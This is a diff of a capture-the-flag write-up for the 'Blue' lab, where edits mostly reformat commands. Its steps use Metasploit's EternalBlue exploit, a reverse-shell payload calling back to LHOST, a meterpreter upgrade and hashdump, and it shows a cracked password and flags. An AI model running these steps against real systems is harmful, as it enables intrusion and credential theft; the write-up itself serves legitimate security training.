@@ -12,12 +12,12 @@
 
 <br />
 
-Nmap will help us gather some information about our target. For the purposes of this box, since task 1.3 is asking *what this machine is vulnerable to*, we will be adding the "-sS --script=vuln" argument to our nmap scan:
+Nmap will help us gather some information about our target. For the purposes of this box, since task 1.3 is asking *what this machine is vulnerable to*, we will be adding the ```-sS --script=vuln``` argument to our nmap scan:
 ```
 nmap -sC -sV -sS --script=vuln -oN nmap/initial REMOTE_IP
 ```
 
-The "initial" output file under the "nmap" folder shows the following:
+The ```initial``` output file under the ```nmap``` folder shows the following:
 ```
 # Nmap 7.92 scan initiated Mon May 30 07:24:31 2022 as: nmap -sC -sV -sS --script=vuln -oN nmap/initial 10.10.239.152
 Nmap scan report for 10.10.239.152
@@ -116,7 +116,7 @@ No answer needed
 
 <br />
 
-Searching Metasploit for "MS17-010" will show the relevant modules we could use to attack the machine.
+Searching Metasploit for ```MS17-010``` will show the relevant modules we could use to attack the machine.
 ```
 search MS17-010
 ```
@@ -141,7 +141,7 @@ exploit/windows/smb/ms17_010_eternalblue
 
 <br />
 
-Running the "show options" command shows us which values we need to set before we can successfully execute the exploit:
+Running the ```show options``` command shows us which values we need to set before we can successfully execute the exploit:
 ```
 show options
 ```
@@ -151,7 +151,7 @@ show options
 ```
 set RHOSTS REMOTE_IP
 ```
-Although this is not mentioned in this task, seeing as the exploit can successfully run without this setting, I found that updating the LHOST value with the local IP resolved some issues executing the exploit successfully.
+Although this is not mentioned in this task, seeing as the exploit can successfully run without this setting, I found that updating the ```LHOST``` value with our local IP resolved some issues executing the exploit successfully.
 ```
 set LHOST LOCAL_IP
 ```
@@ -173,7 +173,7 @@ RHOSTS
 
 As mentioned in the task description this step is optional, however anything that benefits us in our learning process is always welcome! 
 <br />
-Having said that, my personal experience using this payload with Blue was problematic due to multiple sessions that interfered both with my console, as well as my overall bandwidth.
+Having said that, my personal experience using this payload with Blue was problematic due to multiple sessions that interfered both with my console, as well as my overall bandwidth, so feel free to skip this in case your run into any issues as well.
 ```
 set payload windows/x64/shell/reverse_tcp
 ```
@@ -215,11 +215,11 @@ Alternatively:
 Ctrl + Z
 ```
 
-We now have to go back and search for "shell_to_meterpreter" as hinted on the question.
+We now have to go back and search for ```shell_to_meterpreter``` as hinted on the question.
 ```
 search shell_to_meterpreter
 ```
-The only result coming up is "post/multi/manage/shell_to_meterpreter".
+The only result coming up is ```post/multi/manage/shell_to_meterpreter```.
 
 ![image](https://user-images.githubusercontent.com/14150485/171119350-819f41db-0d4b-40fc-8165-3cc20900b5af.png)
 
@@ -233,7 +233,7 @@ post/multi/manage/shell_to_meterpreter
 
 <br />
 
-Listing the options for this module, we will be required to update the "SESSION" attribute with our active session ID.
+Listing the options for this module, we will be required to update the ```SESSION``` attribute with our active session ID.
 
 ![image](https://user-images.githubusercontent.com/14150485/171119843-5c4500bc-8dc8-4489-b6e1-c2b6ed15dfd2.png)
 
@@ -248,7 +248,7 @@ SESSION
 
 <br />
 
-We can view our active session ID using the "sessions" command.
+We can view our active session ID using the ```sessions``` command.
 ```
 sessions
 ```
@@ -300,7 +300,7 @@ No answer needed
 
 <br />
 
-As instructed, using the "shell" and "whoami" commands will show us the current privileges on the target system.
+As instructed, using the ```shell``` and ```whoami``` commands will show us the current privileges on the target system.
 
 ![image](https://user-images.githubusercontent.com/14150485/171121162-aef02aea-2cf5-4878-9171-75042643ab5d.png)
 
@@ -314,11 +314,11 @@ No answer needed
 
 <br />
 
-For this, we need to move back to the meterpreter shell using "Ctrl + Z".
+For this, we need to move back to the meterpreter shell using ```Ctrl + Z```.
 ```
 Ctrl + Z
 ```
-We can now run the "ps" command to list the active processes.
+We can now run the ```ps``` command to list the active processes.
 ```
 ps
 ```
@@ -353,7 +353,7 @@ No answer needed
 
 <br />
 
-This one is simple, we just need to run the "hashdump" commmand to get the hashes.
+This one is simple, we just need to run the ```hashdump``` commmand to get the hashes.
 ```
 hashdump
 ```
@@ -395,11 +395,11 @@ alqfna22
 
 <br />
 
-Easy one - The top folder on Windows systems is "C:\\", as also subtly hinted on the question.
+Easy one - The top folder on Windows systems is ```C:\```, as also subtly hinted on the question.
 
 ![image](https://user-images.githubusercontent.com/14150485/171124609-030be4c9-1e72-44db-93a8-f1bfe75e6a9a.png)
 
-Here it is - "flag1.txt" is indeed located in this folder. Now for the file contents.
+Here it is - ```flag1.txt``` is indeed located in this folder. Now for the file contents.
 ```
 cat flag1.txt
 ```
@@ -422,7 +422,7 @@ flag{access_the_machine}
 
 *Errata: Windows really doesn't like the location of this flag and can occasionally delete it. It may be necessary in some cases to terminate/restart the machine and rerun the exploit to find this flag. This relatively rare, however, it can happen.*
 
-On Windows systems, local user account details are stored in "C:\Windows\system32\config\\". Navigating to this folder and listing its contents confirms the existence of the "flag2.txt" file.
+On Windows systems, local user account details are stored under the ```C:\Windows\system32\config\``` directory. Navigating to this location and listing its contents confirms the existence of the ```flag2.txt``` file.
 ```
 cd Windows\\System32\\config\\
 ls
@@ -454,13 +454,13 @@ There are multiple ways of varying complexity that we can employ to approach thi
 
 <br />
 
-The question is hinting us at "Administrators" and *things* they save. As we saw in task [4.1](https://github.com/EvanDiamantidis/TryHackMe/tree/main/Blue#41-within-our-elevated-meterpreter-shell-run-the-command-hashdump-this-will-dump-all-of-the-passwords-on-the-machine-as-long-as-we-have-the-correct-privileges-to-do-so-what-is-the-name-of-the-non-default-user), there are 3 accounts on this machine - Administrator, Guest and Jon. Navigating to the "C:\Users\\" folder, however, we only see a "Jon" folder along with the default ones, such as "All Users", "Default", "Public", etc.
+The question is hinting us at *Administrators* and *things* they save. As we saw in task [4.1](https://github.com/EvanDiamantidis/TryHackMe/tree/main/Blue#41-within-our-elevated-meterpreter-shell-run-the-command-hashdump-this-will-dump-all-of-the-passwords-on-the-machine-as-long-as-we-have-the-correct-privileges-to-do-so-what-is-the-name-of-the-non-default-user), there are 3 accounts on this machine - *Administrator*, *Guest* and *Jon*. Navigating to the ```C:\Users\``` folder, however, we only see a ```Jon``` folder along with the default ones, such as ```All Users```, ```Default```, ```Public```, etc.
 
 ![image](https://user-images.githubusercontent.com/14150485/171125416-fbbd89cf-6b4f-48a9-8c19-c46b8f5c9148.png)
 
 Interesting, as this means we are most likely to find something in there! 
 <br />
-*Administrators usually have pretty interesting things saved*, and it just so happens that we are looking for a flag which, more often than not, is a string saved in a text file. This should prompt us to have a look under the "Documents" folder and see if we can find anything useful.
+*Administrators usually have pretty interesting things saved*, and it just so happens that we are looking for a flag which, more often than not, is a string saved in a text file. This should prompt us to have a look around, but mainly under ```Documents``` and see if we can find anything useful.
 
 ![image](https://user-images.githubusercontent.com/14150485/171125576-e3ca2133-0861-41cd-a6c9-69b77ade528a.png)
 
@@ -484,7 +484,9 @@ Congrats, you just pwned Blue!
 
 # *** **SPOILER** ***
 
-There is a way we can actually get all the flag file paths using a single command, simply by searching the machine for any text files that include the word "flag" in the file name.
+<br />
+
+There is a way we can actually get all the flag file paths using a single command, simply by searching the machine for any text files that include the word ```flag``` in the file name.
 
 ```
 search -f *flag*.txt
@@ -492,7 +494,7 @@ search -f *flag*.txt
 
 ![image](https://user-images.githubusercontent.com/14150485/171125961-d611bd70-b843-4d0c-a700-6962bf850de1.png)
 
-Although this is the most efficient solution to the challenge, it might be counter-productive to the process, seeing as we should aim to conduct our own research based on the hints provided for each flag as part of our learning process around the use of Metasploit, Meterpreter, shell and session switching, as well as Windows filesystems in general. That said, knowing how and when to take advantage of Meterpreter commands is excellent knowledge in itself.
+Although this is the most efficient solution to the challenge, it might be counter-productive to the process - Reason being that we should ideally aim to conduct our own research based on the hints provided for each flag as part of our learning process around the use of Metasploit, Meterpreter, shell and session switching, as well as Windows filesystems in general. That said, knowing how and when to take advantage of Meterpreter commands is powerful knowledge in itself.
 
 <br />
 
